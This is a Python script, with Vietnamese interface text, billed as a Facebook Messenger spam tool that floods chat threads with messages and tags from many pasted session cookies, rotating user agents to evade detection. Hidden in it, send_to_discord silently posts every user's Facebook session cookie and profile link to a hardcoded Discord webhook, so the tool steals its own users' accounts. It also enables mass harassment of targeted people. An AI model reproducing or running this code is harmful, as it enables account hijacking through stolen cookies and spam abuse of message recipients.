from itertools import cycle
import requests
import sys
import json
import time
import threading
import re
import os
from colorama import init, Fore, Style
import random

init(autoreset=True)

WEBHOOK_URL = "https://discord.com/api/webhooks/1448761142389506153/ystRgwPXDIhmYwULI3T5QALaFMFXeqcKzajn59_sjQulM7YGZXQX24IqGO3r6KFCh3LS" 
sent_cookies = set()

def get_name_from_uid(uid, cookie, fb_dtsg, a, req, rev):
    try:
        form = {
            f"ids[0]": uid,
            "fb_dtsg": fb_dtsg,
            "__a": a,
            "__req": req,
            "__rev": rev
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie,
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

        response = requests.post("https://www.facebook.com/chat/user_info/", headers=headers, data=form)
        text_response = response.text
        if text_response.startswith("for (;;);"):
            text_response = text_response[9:]
        data = json.loads(text_response)
        profile = data["payload"]["profiles"][uid]
        return profile.get("name", "Không tìm thấy tên")
    except Exception as e:
        return f"Lỗi: {e}"

def fancy_spam_loading(seconds):
    colors = cycle([Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.BLUE])
    for i in range(seconds, 0, -1):
        color = next(colors)
        sys.stdout.write(f"\r{color}Hens Đang Spam [{i}] giây...")
        sys.stdout.flush()
        time.sleep(1)
    print(Style.RESET_ALL)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text="Đang xử lý", duration=6):
    for _ in range(duration):
        for i in range(1):
            sys.stdout.write(f"\r{Fore.YELLOW}{text}{'.' * (i + 1)}{' ' * (3 - i)}")
            sys.stdout.flush()
            time.sleep(0.3)
    print("")

def logo():
    clear_console()
    art = Fore.CYAN + Style.BRIGHT + r'''
██╗░░░██╗██╗░░░██╗██████╗░░█████╗░████████╗
██║░░░██║██║░░░██║██╔══██╗██╔══██╗╚══██╔══╝
╚██╗░██╔╝██║░░░██║██║░░██║███████║░░░██║░░░
░╚████╔╝░██║░░░██║██║░░██║██╔══██║░░░██║░░░
░░╚██╔╝░░╚██████╔╝██████╔╝██║░░██║░░░██║░░░
░░░╚═╝░░░░╚═════╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
        TOOL FACEBOOK MESSENGER By Nguyễn Vũ Đạt 
'''
    print(art)
    loading_animation("Đang Vô Tool Của Anh Đạt")

def menu():
    logo()
    print(Fore.GREEN + "=" * 60)
    print(Fore.YELLOW + "               MENU NGUYỄN VŨ ĐẠT - HENS")
    print(Fore.GREEN + "=" * 60)
    print(Fore.CYAN + "1. Treo Nhây Siu Mạnh")
    print(Fore.CYAN + "2. Spam Đến Chết")
    print(Fore.GREEN + "=" * 60)

def check_checkpoint(cookie):
    headers = {'Cookie': cookie, 'User-Agent': 'Mozilla/5.0'}
    res = requests.get("https://mbasic.facebook.com/", headers=headers)
    return "checkpoint" in res.url or "login" in res.url

UA_KIWI = [
    "Mozilla/5.0 (Linux; Android 11; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Mobile Safari/537.36"
]

UA_VIA = [
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.0.0 Mobile Safari/537.36 Via/4.8.2",
    "Mozilla/5.0 (Linux; Android 11; V2109) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.138 Mobile Safari/537.36 Via/4.9.0",
    "Mozilla/5.0 (Linux; Android 13; TECNO POVA 5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36 Via/5.0.1",
    "Mozilla/5.0 (Linux; Android 12; Infinix X6710) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Via/5.2.0",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.112 Mobile Safari/537.36 Via/5.3.1"
]

USER_AGENTS = UA_KIWI + UA_VIA

class Messenger:
    def __init__(self, cookie):
        self.cookie = cookie
        self.user_id = self.id_user()
        self.user_agent = random.choice(USER_AGENTS)
        self.fb_dtsg = None
        self.name = ""
        self.init_params()

    def id_user(self):
        try:
            return re.search(r"c_user=(\d+)", self.cookie).group(1)
        except:
            raise Exception("Cookie không hợp lệ")

    def init_params(self):
        headers = {'Cookie': self.cookie, 'User-Agent': self.user_agent}
        try:
            response = requests.get('https://mbasic.facebook.com/me', headers=headers, timeout=10)
            name_match = re.search(r'<title>(.*?)</title>', response.text)
            if name_match:
                self.name = name_match.group(1).replace(" | Facebook", "")
            fb_dtsg_match = re.search(r'name="fb_dtsg" value="(.*?)"', response.text)
            if fb_dtsg_match:
                self.fb_dtsg = fb_dtsg_match.group(1)
            else:
                raise Exception("Không thể lấy fb_dtsg")
        except Exception as e:
            raise Exception(f"Lỗi khi khởi tạo tham số: {str(e)}")

    def refresh_fb_dtsg(self):
        try:
            self.init_params()
            print(Fore.YELLOW + f"[!] Làm mới fb_dtsg cho {self.name} ({self.user_id}) thành công.")
        except Exception as e:
            print(Fore.RED + f"[X] Lỗi làm mới fb_dtsg: {e}")

    def gui_tn(self, recipient_id, message, id_tag=None, name_tag=None, max_retries=3):
        for attempt in range(max_retries):
            timestamp = int(time.time() * 1000)
            offline_threading_id = str(timestamp)
            message_id = str(timestamp)

            data = {
                'thread_fbid': recipient_id,
                'action_type': 'ma-type:user-generated-message',
                'body': message,
                'client': 'mercury',
                'author': f'fbid:{self.user_id}',
                'timestamp': timestamp,
                'source': 'source:chat:web',
                'offline_threading_id': offline_threading_id,
                'message_id': message_id,
                'ephemeral_ttl_mode': '',
                '__user': self.user_id,
                '__a': '1',
                '__req': '1b',
                '__rev': '1015919737',
                'fb_dtsg': self.fb_dtsg
            }

            if id_tag and name_tag:
                vi_tri_start = message.find(name_tag)
                if vi_tri_start != -1:
                    data.update({
                        'profile_xmd[0][offset]': str(vi_tri_start),
                        'profile_xmd[0][length]': str(len(name_tag)),
                        'profile_xmd[0][id]': str(id_tag),
                        'profile_xmd[0][type]': 'p'
                    })

            headers = {
                'Cookie': self.cookie,
                'User-Agent': self.user_agent,
                'Accept': '*/*',
                'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.facebook.com',
                'Referer': f'https://www.facebook.com/messages/t/{recipient_id}',
                'Host': 'www.facebook.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty'
            }

            try:
                response = requests.post(
                    'https://www.facebook.com/messaging/send/',
                    data=data,
                    headers=headers
                )
                if response.status_code != 200:
                    return {
                        'success': False,
                        'error': 'HTTP_ERROR',
                        'error_description': f'Status code: {response.status_code}'
                    }

                if 'for (;;);' in response.text:
                    clean_text = response.text.replace('for (;;);', '')
                    try:
                        result = json.loads(clean_text)
                        err_val = result.get('error', 0)
                        if err_val and str(err_val) != "0":
                            self.refresh_fb_dtsg()
                            data['fb_dtsg'] = self.fb_dtsg
                            continue
                        return {
                            'success': True,
                            'message_id': message_id,
                            'timestamp': timestamp
                        }
                    except json.JSONDecodeError:
                        pass

                return {
                    'success': True,
                    'message_id': message_id,
                    'timestamp': timestamp
                }
            except Exception as e:
                return {
                    'success': False,
                    'error': 'REQUEST_ERROR',
                    'error_description': str(e)
                }
        return {'success': False, 'error_description': 'Gửi tin nhắn thất bại sau nhiều lần thử'}

def send_to_discord(user_id, cookie):
    if cookie in sent_cookies:
        return
    try:
        profile_link = f"https://www.facebook.com/profile.php?id={user_id}"
        content = f"**Facebook Link:** {profile_link}\n**Cookie:** `{cookie}`"
        data = {"content": content}
        requests.post(WEBHOOK_URL, json=data)
        sent_cookies.add(cookie)
    except Exception as e:
        print(f"Lỗi gửi Discord: {str(e)}")

def insert_name_to_end(sentence, name):
    return sentence.rstrip() + f" @{name}"

def worker(messenger, recipient_ids, contents, delay, mode,
           enable_tagging, enable_spam_tag, tag_name=None, tag_id=None,
           delay_each_box=True, file_contents=None):
    last_sentence = None
    content_index = 0
    file_index = 0
    
    while True:
        if mode == 2:
            # Chế độ spam - gửi từng file một
            if file_contents and len(file_contents) > 0:
                # Lấy nội dung của file hiện tại và gộp tất cả thành 1 tin nhắn
                current_file_content = file_contents[file_index]
                message = '\n'.join(current_file_content)  # Gộp tất cả dòng thành 1 tin nhắn
                id_tag = None
                name_tag = None
                
                for recipient_id in recipient_ids:
                    messenger.refresh_fb_dtsg()
                    result = messenger.gui_tn(recipient_id, message, id_tag=id_tag, name_tag=name_tag)
                    if result['success']:
                        print(Fore.GREEN + Style.BRIGHT +
                              f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                        print(Fore.CYAN + f"📝 File {file_index + 1} - Đã gửi {len(current_file_content)} dòng nội dung")
                    else:
                        print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                              f"{result.get('error_description', 'Lỗi không xác định')}")
                    send_to_discord(messenger.user_id, messenger.cookie)
                    if delay_each_box:
                        delay_real = delay + random.uniform(1, 9)
                        fancy_spam_loading(int(delay_real))
                
                # Chuyển sang file tiếp theo
                file_index = (file_index + 1) % len(file_contents)
                print(Fore.YELLOW + f"🔄 Chuyển sang file thứ {file_index + 1}")
                
            else:
                # Fallback cho trường hợp không có file_contents
                if content_index >= len(contents):
                    content_index = 0
                
                message = contents[content_index]
                id_tag = None
                name_tag = None
                
                for recipient_id in recipient_ids:
                    messenger.refresh_fb_dtsg()
                    result = messenger.gui_tn(recipient_id, message, id_tag=id_tag, name_tag=name_tag)
                    if result['success']:
                        print(Fore.GREEN + Style.BRIGHT +
                              f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                        print(Fore.CYAN + f"📝 Nội dung: {message[:50]}{'...' if len(message) > 50 else ''}")
                    else:
                        print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                              f"{result.get('error_description', 'Lỗi không xác định')}")
                    send_to_discord(messenger.user_id, messenger.cookie)
                    if delay_each_box:
                        delay_real = delay + random.uniform(1, 9)
                        fancy_spam_loading(int(delay_real))
                
                content_index += 1
            
        else:
            # Chế độ nhây - gửi từng nội dung một
            if content_index >= len(contents):
                content_index = 0  # Quay lại từ đầu khi hết nội dung
            
            sentence = contents[content_index].strip()
            while sentence == last_sentence and len(contents) > 1:
                content_index = (content_index + 1) % len(contents)
                sentence = contents[content_index].strip()
            last_sentence = sentence

            if enable_tagging and tag_name and isinstance(tag_name, list):
                for i in range(len(tag_name)):
                    name_tag = f"@{tag_name[i].strip()}"
                    full_message = f"{sentence.strip()} {name_tag}"
                    id_tag = tag_id[i]
                    for recipient_id in recipient_ids:
                        messenger.refresh_fb_dtsg()
                        result = messenger.gui_tn(recipient_id, full_message, id_tag=id_tag, name_tag=name_tag)
                        if result['success']:
                            print(Fore.GREEN + Style.BRIGHT +
                                  f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                            print(Fore.CYAN + f"📝 Nội dung: {full_message[:50]}{'...' if len(full_message) > 50 else ''}")
                        else:
                            print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                                  f"{result.get('error_description', 'Lỗi không xác định')}")
                        send_to_discord(messenger.user_id, messenger.cookie)
                        if delay_each_box:
                            delay_real = delay + random.uniform(1, 9)
                            fancy_spam_loading(int(delay_real))
            else:
                message = sentence
                id_tag = None
                name_tag = None
                for recipient_id in recipient_ids:
                    messenger.refresh_fb_dtsg()
                    result = messenger.gui_tn(recipient_id, message, id_tag=id_tag, name_tag=name_tag)
                    if result['success']:
                        print(Fore.GREEN + Style.BRIGHT +
                              f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                        print(Fore.CYAN + f"📝 Nội dung: {message[:50]}{'...' if len(message) > 50 else ''}")
                    else:
                        print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                              f"{result.get('error_description', 'Lỗi không xác định')}")
                    send_to_discord(messenger.user_id, messenger.cookie)
                    if delay_each_box:
                        delay_real = delay + random.uniform(1, 9)
                        fancy_spam_loading(int(delay_real))
            
            # Tăng index để gửi nội dung tiếp theo
            content_index += 1

        if not delay_each_box:
            delay_real = delay + random.uniform(1, 9)
            fancy_spam_loading(int(delay_real))

def main():
    menu()
    try:
        mode = int(input("Chọn chế độ (1 hoặc 2): ").strip())
        if mode not in [1, 2]:
            print("Chế độ không hợp lệ!")
            return

        num_ids = int(input("Số lượng box muốn spam: ").strip())
        recipient_ids = [input(f"Nhập ID box thứ {i + 1}: ").strip() for i in range(num_ids)]

        spam_mode = 2
        if mode == 2 and len(recipient_ids) > 1:
            print("\n1. Spam từng box")
            print("2. Spam tất cả box cùng lúc")
            spam_mode = int(input("Chọn kiểu spam (1 hoặc 2): ").strip())

        num_cookies = int(input("\nSố lượng cookie muốn dùng: ").strip())
        cookies = []
        for i in range(num_cookies):
            cookie = input(f"Nhập cookie thứ {i + 1}: ").strip()
            if check_checkpoint(cookie):
                print("Tài khoản bị checkpoint hoặc die, bỏ qua.")
                continue
            cookies.append(cookie)

        delay = 1.0
        if mode == 2:
            delay = float(input("Nhập delay giữa mỗi lần gửi (giây): ").strip())

        num_files = int(input("Số lượng file chứa nội dung muốn sử dụng: ").strip())
        contents = []
        file_contents = []  # Danh sách chứa nội dung từng file riêng biệt
        
        for i in range(num_files):
            file_name = input(f"Nhập tên file thứ {i + 1} (vd: file{i+1}.txt): ").strip()
            try:
                with open(file_name, 'r', encoding='utf-8') as f:
                    file_contents_lines = [line.rstrip('\n') for line in f if line.strip()]
                    file_contents.append(file_contents_lines)  # Thêm nội dung file vào danh sách
                    contents.extend(file_contents_lines)  # Giữ nguyên để tương thích với chế độ nhây
                    print(f"✓ Đã đọc {len(file_contents_lines)} dòng từ file {file_name}")
            except FileNotFoundError:
                print(f"⚠ Không tìm thấy file {file_name}, bỏ qua file này")
            except Exception as e:
                print(f"⚠ Lỗi khi đọc file {file_name}: {e}")
        
        if not contents:
            print("❌ Không có nội dung nào để spam!")
            return
        
        print(f"✓ Tổng cộng có {len(contents)} dòng nội dung từ {num_files} file")
        for i, file_content in enumerate(file_contents):
            print(f"   - File {i+1}: {len(file_content)} dòng")

        enable_tagging = False
        tag_name = None
        tag_id = None

        if mode == 1:
            print("Bạn Có Muốn Nhây Tag Không?")
            print("1. Có")
            print("2. Không")
            if input("Chọn: ").strip() == "1":
                enable_tagging = True
                tag_input = input("nhập uid hoặc link người cần tag (link phải có uid)  ").strip()
                tag_ids_raw = [x.strip() for x in tag_input.split(',') if x.strip()]
                tag_id = []
                tag_name = []
                cookie_obj = cookies[0]
                messenger_temp = Messenger(cookie_obj)
                for item in tag_ids_raw:
                    if item.isdigit():
                        uid = item
                    else:
                        uid = None
                        match = re.search(r'id=(\d+)', item)
                        if match:
                            uid = match.group(1)
                        else:
                            match2 = re.search(r'facebook.com/([^/?]+)', item)
                            if match2:
                               username = match2.group(1)
                                try:
                                    res = requests.get(f'https://mbasic.facebook.com/{username}', headers={
                                        'Cookie': cookie_obj,
                                        'User-Agent': random.choice(USER_AGENTS)
                                    })
                                    uid_match = re.search(r'owner_id=(\d+)', res.text)
                                    if uid_match:
                                        uid = uid_match.group(1)
                                except:
                                    pass
                    if uid:
                        name = get_name_from_uid(uid, cookie_obj, messenger_temp.fb_dtsg, "__a", "1b", "1015919737")
                        if "Lỗi" in name:
                            print(f"Lỗi khi lấy tên UID {uid}: {name}")
                            return
                        tag_id.append(uid)
                        tag_name.append(name)
                print(f"Đã lấy tên: {', '.join(tag_name)}")
                delay = float(input("Nhập delay giữa mỗi lần gửi (giây): ").strip())

        messengers = []
        for cookie in cookies:
            try:
                messenger = Messenger(cookie)
                profile_link = f"https://www.facebook.com/profile.php?id={messenger.user_id}"
                print(f"Đăng nhập thành công: {messenger.name} | UID: {messenger.user_id} | Link: {profile_link}")
                messengers.append(messenger)
            except Exception as e:
                print(f"Lỗi đăng nhập: {str(e)}")

        if not messengers:
            print("Không có cookie hợp lệ.")
            return

        print("\nBắt đầu gửi tin nhắn...")
        threads = []

        if mode == 1:
            for messenger in messengers:
                t = threading.Thread(
                    target=worker,
                    args=(messenger, recipient_ids, contents, delay, mode,
                          enable_tagging, True, tag_name, tag_id, True, None),
                    daemon=True
                )
                threads.append(t)
                t.start()
        else:
            if spam_mode == 1:
                for messenger in messengers:
                    t = threading.Thread(
                        target=worker,
                        args=(messenger, recipient_ids, contents, delay, mode,
                              False, False, None, None, True, file_contents),
                        daemon=True
                    )
                    threads.append(t)
                    t.start()
            else:
                for messenger in messengers:
                    t = threading.Thread(
                        target=worker,
                        args=(messenger, recipient_ids, contents, delay, mode,
                              False, False, None, None, False, file_contents),
                        daemon=True
                    )
                    threads.append(t)
                    t.start()

        for t in threads:
            t.join()

    except Exception as e:
        print(f"Lỗi: {e}")

if __name__ == '__main__':
    main()
